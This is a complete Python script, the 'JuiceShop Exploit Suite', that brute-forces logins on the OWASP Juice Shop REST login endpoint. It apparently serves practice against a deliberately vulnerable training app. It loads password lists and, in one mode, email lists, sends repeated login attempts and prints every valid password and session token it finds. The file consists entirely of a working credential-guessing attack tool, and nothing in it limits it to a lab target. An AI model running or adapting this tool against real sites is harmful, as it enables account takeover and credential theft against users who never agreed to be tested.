import requests 
import sys
import json
from colorama import Fore, Style
import argparse
import time 
import signal



class JuiceShopExploitSuite:
    def __init__(self, host, port):
        self.base = f"http://{host}:{port}"
        self.token = None
        self.user_email = None
        self.successfull_passwords = []
        self.running = True



    def Login(self, email, password, retries=2):
    
        url = f"{self.base}/rest/user/login" 
        
        
        
        
        for attempt in range(retries):
            if not self.running:
                return False
            
            
            try:
                response = requests.post(url, json={'email': email, "password": password}, timeout=5)
    
        
                if response.status_code == 200:
                
                    self.token = response.json()['authentication']['token']
                    self.user_email = email
                    print(f"{Fore.GREEN}\n[+] Login successful!{Style.RESET_ALL}")
                    print(f'{Fore.GREEN}[+] Email: {email}{Style.RESET_ALL}')
                    print(f'{Fore.GREEN}[+] Password: {password}{Style.RESET_ALL}')
                    print (f"{Fore.GREEN}[+] Token: {self.token[:50]}...\n{Style.RESET_ALL}")
                    return True
        
                else:
                    return False
        

            except requests.exceptions.RequestException as e:
                if attempt < retries - 1:
                    print(f"{Fore.LIGHTYELLOW_EX}[!] Connection error, retrying... ({attempt + 1}/{retries}){Style.RESET_ALL}")
                    time.sleep(2)
                    
                else:
                    
                    print(f"{Fore.RED}[-] Connection error after {retries} attempts: {e}{Style.RESET_ALL}")
                    print(f"{Fore.LIGHTYELLOW_EX}[!] Aborting brute due to connection error{Style.RESET_ALL}")
                    raise
             
                
            
        
        
        
    def brute_force_password(self, email, password_file):
        print(f"{Fore.CYAN}[*] Starting brute force attack on {email}{Style.RESET_ALL}")
        print(f'{Fore.CYAN}[*] Loading passwords from: {password_file}{Style.RESET_ALL}')
        
        
        try:
            with open(password_file, 'r', encoding='utf-8') as file:
                passwords = [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            print(f"{Fore.RED}[-] File not found: {password_file}{Style.RESET_ALL}")
            return False
        except Exception as e:
            print(f'{Fore.RED}Error reading file: {e}{Style.RESET_ALL}')
            return False
        
        print(f"{Fore.YELLOW}[*] Loaded {len(passwords)} passwords{Style.RESET_ALL}")
        print(f'{Fore.YELLOW}[*] Starting attack... (Press CTRL+C to stop){Style.RESET_ALL}')
        
        attempt = 0
        for password in passwords:
            if not self.running:
                print(f"{Fore.LIGHTYELLOW_EX}[!] Brute force interrupted by user{Style.RESET_ALL}")
                return False
            
            
            
            attempt += 1
            
            if attempt % 10 == 0:
                print(f'{Fore.BLUE}[*] Progress: {attempt}/{len(passwords)} attempts...{Style.RESET_ALL}')

            
            
            
            if self.Login(email, password):
                self.successfull_passwords.append({
                    'email': email,
                    'password': password,
                    'token': self.token
                })
                self.print_report()
                return True
        

        
        
        print(f"{Fore.RED}[-] Brute force complited. Not valid password found{Style.RESET_ALL}")
        
        return False        
        
        
        
        
        
    def brute_force_multi_user(self, email_file, password_file):
        
        print(f'{Fore.CYAN}[*] Loading emails from {email_file}{Style.RESET_ALL}')       
        
        
        try:
            with open(email_file, 'r', encoding='utf-8') as file:
                emails = [line.strip() for line in file if line.strip()]
        
        except FileNotFoundError:
            print(f'{Fore.RED}[-] Email file not found: {email_file}{Style.RESET_ALL}')
            return False
        
        except Exception as e:
            print(f"{Fore.RED}Error reading email file: {e}{Style.RESET_ALL}")
            return False
        
        
        print(f"{Fore.YELLOW}[*] Loaded {len(emails)} email addresses{Style.RESET_ALL}")
        
        
        try:
            for email in emails:
                if not self.running:  
                    break
                
                
                print(f"{Fore.CYAN}[*] Trying email: {email}{Style.RESET_ALL}")
                if self.brute_force_password(email, password_file):
                    print(f'{Fore.GREEN}[+] Found credentials!{Style.RESET_ALL}')
                    print(f"{Fore.GREEN}[+] Email: {email}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] Password: {self.successfull_passwords[-1]['password']}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] Token: {self.successfull_passwords[-1]['token'][:50]}...{Style.RESET_ALL}\n")
        
        
                    response = input("[?] Continue searching for other users? (y/n):")
                    time.sleep(1)
                    if response.lower() != 'y':
                        break
        
        except requests.exceptions.RequestException:
            print(f"{Fore.LIGHTYELLOW_EX}[!] Stopping multi-user brute force due to connection error{Style.RESET_ALL}")
        
            self.print_report()
            return False        
        
        
        
        self.print_report()
        return len(self.successfull_passwords) > 0
        
        
        
    def print_report(self):
        
        print(f"{Fore.MAGENTA}\nBRUTE FORCE REPORT{Style.RESET_ALL}")
        
        
        if self.successfull_passwords:
            print(f'{Fore.GREEN}[+] Found {len(self.successfull_passwords)} valid credentials:{Style.RESET_ALL}')
            
            for cred in self.successfull_passwords:
                print(f'  Email: {cred["email"]}')
                print(f"  Password: {cred['password']}")
                print(f"  Token: {cred['token']}")
        else:
            print(f"{Fore.RED}[-] No valid credentials found{Style.RESET_ALL}")
            
        print(f"{Fore.MAGENTA}{'-' * 50}{Style.RESET_ALL}")
        
        
    def stop(self):   
        self.running = False
     
     
def signal_handler(exploit):
        
    def handler(signum, frame):
        print(f'{Fore.LIGHTYELLOW_EX}[!] Ctrl+C detected! Stopping brute force...{Style.RESET_ALL}')
        time.sleep(1)
        exploit.stop()
    return handler
     
     
def main():


    parser = argparse.ArgumentParser(description='JuiceShop Exploit Suite')
    parser.add_argument('-u', '--host', required=True, help='Target IP address')
    parser.add_argument('-p', '--port', required=True, type=int, help="Target port")
    
    
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-s', '--single', metavar='email', help='Single user mode with email')
    
    group.add_argument('-m', '--multi', metavar='email_file', help='Multi user mode with email file')
    
    
    parser.add_argument('password_file', help='Password file path')
    
    
    args = parser.parse_args()
    
    exploit = JuiceShopExploitSuite(args.host, args.port)
    
    signal.signal(signal.SIGINT, signal_handler(exploit))
    
    
    print(f"{Fore.CYAN}[*] Target: {args.host}:{args.port}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop at any time{Style.RESET_ALL}\n")
    
    
    try:
        
        if args.single:
            result = exploit.brute_force_password(args.single, args.password_file)
            
            if result:
                print(f"{Fore.GREEN}[+] Attack complited successfully!{Style.RESET_ALL}")
                
            else:
                print(f"{Fore.RED}[-] Attack failed to find credentials{Style.RESET_ALL}")

        else:
            exploit.brute_force_multi_user(args.multi, args.password_file)
            
            
    except KeyboardInterrupt:
        print(f"{Fore.LIGHTYELLOW_EX}[!] Brute force interrupted by user{Style.RESET_ALL}")
        exploit.print_report()
        sys.exit(0)  
                     
    except requests.exceptions.RequestException:
        print(f"{Fore.LIGHTYELLOW_EX}[!] Program terminated due to connection error{Style.RESET_ALL}")
        exploit.print_report()
        sys.exit(1)
        
    except Exception as e:
        print(f"{Fore.RED}[!] Unexpected error: {e}{Style.RESET_ALL}")
        exploit.print_report()
        sys.exit(1)    
        
    

if __name__ == "__main__":
    main()

